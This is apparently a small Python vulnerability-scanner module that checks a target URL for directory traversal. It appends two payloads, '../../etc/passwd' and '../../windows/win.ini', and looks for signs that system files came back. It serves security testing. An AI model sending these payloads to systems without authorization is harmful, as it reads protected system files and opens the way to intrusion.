# scanner/directory_traversal.py
import requests

class DirectoryTraversalScanner:
    def __init__(self, target_url):
        self.target_url = target_url

    def scan(self):
        print(f"Scanning {self.target_url} for directory traversal vulnerabilities...")
        payloads = ["../../etc/passwd", "../../windows/win.ini"]
        for payload in payloads:
            response = requests.get(self.target_url + payload)
            if "root:" in response.text or "[boot loader]" in response.text:
                print(f"Potential directory traversal vulnerability found with payload: {payload}")